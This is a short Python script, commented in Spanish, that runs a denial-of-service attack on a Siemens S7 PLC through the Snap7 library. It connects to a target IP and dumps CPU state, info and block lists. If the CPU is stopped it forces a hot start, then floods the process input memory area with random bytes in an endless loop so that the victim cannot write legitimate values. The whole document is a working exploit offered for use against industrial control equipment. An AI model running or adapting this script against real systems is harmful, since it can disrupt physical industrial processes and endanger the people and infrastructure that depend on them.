import snap7.client as s7
import numpy as np
import sys
import os

## === DoS con Snap7 para Siemens7 PLC ===
# Autor: Alejandro Manuel Lopez Gomez

# Parametros de entrada:
#   - Dirección IP del PLC

# Este programa escribe continuamente bytes aleatorios en
# el area de memoria de la Unidad de Procesamiento de Entrada
# o IPU por sus siglas en ingles. El objetivo es evitar que la víctima
# pueda escribir valores legitimos.

if len(sys.argv) != 2: 
    print("Usage: exploit.py <ip>")
    sys.exit(0)

plc = s7.Client()
plc.connect(str(sys.argv[1]),0,0)

print("[!] Checking connectivity...")
if plc.get_connected():
    print("[OK] PLC is UP!")
    print(f"[!] CPU State: {plc.get_cpu_state()}")
    print(f"[!] CPU Info: {plc.get_cpu_info()}")
    print(f"[!] Blocks available: {plc.list_blocks()}")

    if(plc.get_cpu_state() == "S7CpuStatusStop"):
        print("[!] CPU seems down, starting it...")
        plc.plc_hot_start()
        print("[OK] CPU started!")
    
    print("\n[!] Starting DoS attack... Press Ctrl+C to stop")
    print("[!] For an LED light show look at the PLC! :)\n")
    try:
        start = 0
        max_range = 2048
        while True:
            # data = bytearray(np.random.randint(10, size=max_range))
            num = np.random.randint(0,256)
            data = bytearray([num] * 2048)
            plc.ab_write(start,data)
    except KeyboardInterrupt:
        print("Stopping...")
        sys.exit(0)

else:
    print("[ERROR] PLC is DOWN!")

plc.disconnect()